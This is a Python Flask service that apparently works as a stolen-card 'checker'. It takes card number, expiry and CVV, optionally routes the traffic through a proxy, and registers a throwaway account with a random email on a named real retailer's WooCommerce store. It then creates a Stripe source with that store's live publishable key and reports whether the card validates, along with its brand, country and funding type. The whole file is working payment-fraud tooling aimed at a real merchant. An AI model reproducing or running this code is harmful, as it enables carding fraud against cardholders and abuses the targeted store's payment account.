from flask import Flask, request, jsonify
import requests, re, uuid, random, string

app = Flask(__name__)

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def find_between(text, start, end):
    pattern = re.escape(start) + r"(.*?)" + re.escape(end)
    match = re.search(pattern, text)
    return match.group(1) if match else None

@app.route('/stripeauth', methods=['GET'])
def stripe_auth():
    cc_param = request.args.get('cc')
    proxy = request.args.get('proxy')

    if not cc_param:
        return jsonify({'error': 'Missing cc parameter'}), 400

    try:
        cc, mes, ano, cvv = cc_param.split('|')
    except:
        return jsonify({'error': 'Invalid cc format. Use cc|mm|yy|cvv'}), 400

    mail = generate_random_account()
    r = requests.Session()

    if proxy:
        r.proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

    # Step 1: Get register nonce
    headers = {
        'user-agent': 'Mozilla/5.0',
    }
    response = r.get('https://thefloordepot.com.au/my-account/', headers=headers)
    reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

    # Step 2: Register
    data = {
        'email': mail,
        'password': 't4aa6ffDaVDMRix',
        'woocommerce-register-nonce': reg,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }
    r.post('https://thefloordepot.com.au/my-account/', headers=headers, data=data)

    # Step 3: Get add card nonce
    response = r.get('https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
    adt = find_between(response.text, '"add_card_nonce":"', '","')

    # Step 4: Create Stripe source
    headers_stripe = {
        'user-agent': 'Mozilla/5.0',
        'content-type': 'application/x-www-form-urlencoded',
    }
    stripe_data = {
        'referrer': 'https://thefloordepot.com.au',
        'type': 'card',
        'owner[name]': ' ',
        'owner[email]': mail,
        'card[number]': cc,
        'card[cvc]': cvv,
        'card[exp_month]': mes,
        'card[exp_year]': ano,
        'guid': str(uuid.uuid4()).replace('-', ''),
        'muid': str(uuid.uuid4()).replace('-', ''),
        'sid': str(uuid.uuid4()).replace('-', ''),
        'payment_user_agent': 'stripe.js',
        'time_on_page': '249562',
        'key': 'pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
    }

    stripe_resp = r.post('https://api.stripe.com/v1/sources', headers=headers_stripe, data=stripe_data)
    stripe_data_json = stripe_resp.json()

    source_id = stripe_data_json.get("id", None)
    if not source_id:
        return jsonify({'error': 'Stripe source creation failed', 'response': stripe_data_json}), 400

    # Step 5: Final charge/setup attempt
    headers_final = {
        'user-agent': 'Mozilla/5.0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'x-requested-with': 'XMLHttpRequest'
    }
    params = {'wc-ajax': 'wc_stripe_create_setup_intent'}
    data_final = {'stripe_source_id': source_id, 'nonce': adt}
    final_resp = r.post('https://thefloordepot.com.au/', headers=headers_final, params=params, data=data_final)

    # Build filtered response
    final_data = final_resp.json()
    error_msg = final_data.get("error", {}).get("message")
    status = final_data.get("status", "unknown")

    return jsonify({
        "message": error_msg if error_msg else "Card processed successfully",
        "status": status,
        "brand": stripe_data_json.get("card", {}).get("brand", "N/A"),
        "country": stripe_data_json.get("card", {}).get("country", "N/A"),
        "funding": stripe_data_json.get("card", {}).get("funding", "N/A")
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
